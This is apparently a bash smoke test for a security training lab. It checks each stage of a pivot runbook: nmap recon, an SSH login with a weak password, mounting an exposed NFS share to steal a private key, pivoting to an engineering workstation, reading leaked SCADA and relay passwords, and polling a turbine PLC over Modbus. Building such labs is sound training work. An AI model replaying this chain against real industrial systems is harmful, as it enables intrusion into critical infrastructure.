#!/usr/bin/env bash
# Smoke test: books/admin-home-pivot.md
#
# Walks through the runbook stages and asserts each one works end-to-end against
# a running lab. Assumes './ctl up' has already started the relevant containers.
#
# Coverage:
#   Stage 0  attacker-machine reachable, loot/notes.txt present, nmap finds wizzards-retreat
#   Stage 1  ssh rincewind/wizzard works, NFS export readable, key in NFS share, key login works
#   Stage 2  Ed25519 key login engineer@10.10.2.30 works (from wizzards-retreat)
#   Stage 3  plc-access.conf and plc_poll.log readable on eng-ws
#   Stage 4  modbus reads from turbine PLC return live values
#
# Usage: bash tests/smoke/test_runbook_admin_home_pivot.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

ATTACKER="attacker-machine"
HOME_BOX="admin-home"
ENG_WS="engineering-workstation"

for c in "$ATTACKER" "$HOME_BOX" "$ENG_WS" turbine_plc; do
    require_running "$c"
done

echo "[admin-home-pivot] Waiting for admin-home services to come up..."
if ! wait_for_port "$ATTACKER" 10.10.0.10 22 30; then
    fail "admin-home 10.10.0.10:22 not responding within 30s"
    summary
    exit 1
fi
if ! wait_for_port "$ATTACKER" 10.10.0.10 2049 30; then
    fail "admin-home 10.10.0.10:2049 (NFS) not responding within 30s"
fi

echo "[admin-home-pivot] Stage 0: attacker machine and recon"

if [ -n "$(in_container "$ATTACKER" cat /home/ponder/loot/notes.txt 2>/dev/null)" ]; then
    ok "ponder@unseen-gate has loot/notes.txt"
else
    fail "ponder@unseen-gate is missing loot/notes.txt"
fi

NMAP_OUT="$(in_container "$ATTACKER" nmap -p 22,111,2049 10.10.0.10)"
assert_contains "$NMAP_OUT" "22/tcp +open"   "wizzards-retreat 22/tcp open"
assert_contains "$NMAP_OUT" "111/tcp +open"  "wizzards-retreat 111/tcp open (rpcbind)"
assert_contains "$NMAP_OUT" "2049/tcp +open" "wizzards-retreat 2049/tcp open (nfs)"

echo "[admin-home-pivot] Stage 1a: SSH rincewind/wizzard"

LOGIN_OUT="$(ssh_password_login "$ATTACKER" rincewind 10.10.0.10 wizzard)"
assert_contains "$LOGIN_OUT" "SSH_OK" "ssh rincewind/wizzard authenticates"

echo "[admin-home-pivot] Stage 1b: NFS export discoverable"

SHOWMOUNT_OUT="$(in_container "$ATTACKER" /usr/sbin/showmount -e 10.10.0.10 2>&1)"
assert_contains "$SHOWMOUNT_OUT" "/work" "showmount -e 10.10.0.10 lists /work"

echo "[admin-home-pivot] Stage 1c: NFS share contains key and notes"

MOUNT_OUT="$(in_container "$ATTACKER" sh -c '
mkdir -p /tmp/loot
sudo /usr/bin/mount -t nfs -o vers=3,nolock 10.10.0.10:/work /tmp/loot 2>&1 || exit 1
ls /tmp/loot
sudo /usr/bin/umount /tmp/loot 2>/dev/null
')"
assert_contains "$MOUNT_OUT" "rincewind_id_ed25519" "NFS share exposes rincewind_id_ed25519"
assert_contains "$MOUNT_OUT" "notes.txt"            "NFS share exposes notes.txt"

echo "[admin-home-pivot] Stage 1d: NFS-recovered key logs in over SSH"

KEY_LOGIN_OUT="$(in_container "$ATTACKER" sh -c '
mkdir -p /tmp/loot
sudo /usr/bin/mount -t nfs -o vers=3,nolock 10.10.0.10:/work /tmp/loot 2>/dev/null || exit 1
cp /tmp/loot/rincewind_id_ed25519 /tmp/rk
chmod 600 /tmp/rk
/opt/attacker-env/bin/python3 -c "
import paramiko
c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
k = paramiko.Ed25519Key.from_private_key_file(\"/tmp/rk\")
c.connect(\"10.10.0.10\", username=\"rincewind\", pkey=k, timeout=5,
          allow_agent=False, look_for_keys=False)
print(\"SSH_OK\")
c.close()
"
sudo /usr/bin/umount /tmp/loot 2>/dev/null
')"
assert_contains "$KEY_LOGIN_OUT" "SSH_OK" "NFS-recovered key authenticates as rincewind"

echo "[admin-home-pivot] Stage 2: Ed25519 key from wizzards-retreat to eng-ws"

# Authentication check: SSH exit code is 0 when the key authenticates and the
# remote shell exits cleanly on EOF.
RC="$(in_container "$HOME_BOX" sh -c '
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o BatchMode=yes -o ConnectTimeout=5 \
    -i /home/rincewind/.ssh-keys/uupl_eng_key engineer@10.10.2.30 \
    </dev/null >/dev/null 2>&1
echo $?')"
if [ "$RC" = "0" ]; then
    ok "uupl_eng_key authenticates engineer@10.10.2.30 from wizzards-retreat"
else
    fail "uupl_eng_key does not authenticate engineer@10.10.2.30 (ssh exit code $RC)"
fi

# Visitor experience check: ssh user@host '<cmd>' returns the command output,
# not the banner. The eng-ws facade now honours -c "<cmd>" the way real
# PowerShell would. Without this, visitors have to drop into the prompt
# before doing anything.
WHOAMI_OUT="$(in_container "$HOME_BOX" sh -c '
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o BatchMode=yes -o ConnectTimeout=5 \
    -i /home/rincewind/.ssh-keys/uupl_eng_key engineer@10.10.2.30 \
    whoami 2>/dev/null
')"
assert_contains "$WHOAMI_OUT" "engineer" "ssh ... whoami returns engineer (facade -c works)"

echo "[admin-home-pivot] Stage 3: engineering workstation loot"

WIN_PROFILE="/opt/win10/C/Users/engineer"

PLC_CONF="$(in_container "$ENG_WS" cat "$WIN_PROFILE/config/plc-access.conf" 2>&1)"
assert_contains "$PLC_CONF" "10\.10\.3\.21"            "plc-access.conf names turbine PLC at 10.10.3.21"
assert_contains "$PLC_CONF" "modbus-tcp"               "plc-access.conf names modbus-tcp protocol"
assert_contains "$PLC_CONF" "actuator_cooling_pump"    "plc-access.conf lists cooling pump actuator"

PLC_LOG="$(in_container "$ENG_WS" sh -c "cat $WIN_PROFILE/plc_poll.log 2>&1 || true")"
assert_contains "$PLC_LOG" "poll_and_ingest" "plc_poll.log shows polling activity"

# The runbook's Stage 3 also reads Documents\engineering_notes.txt, which is
# where the credential cascade (historian/SCADA/HMI/relay logins) actually
# leaks. Without this, the test would pass while the credential-discovery
# part of the runbook is unverified.
ENG_NOTES="$(in_container "$ENG_WS" sh -c "cat '$WIN_PROFILE/Documents/engineering_notes.txt' 2>&1 || true")"
assert_contains "$ENG_NOTES" "Historian2015"   "engineering_notes.txt leaks historian DB password"
assert_contains "$ENG_NOTES" "scada_admin"     "engineering_notes.txt leaks SCADA SSH login"
assert_contains "$ENG_NOTES" "relay1234"       "engineering_notes.txt leaks relay IED password"

echo "[admin-home-pivot] Stage 4: turbine PLC modbus reads"

MODBUS_INPUT="$(in_container "$ENG_WS" /venv/bin/python3 "$WIN_PROFILE/Tools/modbus_read.py" 10.10.3.21 502 input 0 11 2>&1)"
assert_contains "$MODBUS_INPUT" "\[[0-9]" "modbus_read input registers returns a list"

MODBUS_HOLD="$(in_container "$ENG_WS" /venv/bin/python3 "$WIN_PROFILE/Tools/modbus_read.py" 10.10.3.21 502 holding 0 4 2>&1)"
assert_contains "$MODBUS_HOLD" "\[[0-9]" "modbus_read holding registers returns a list"

summary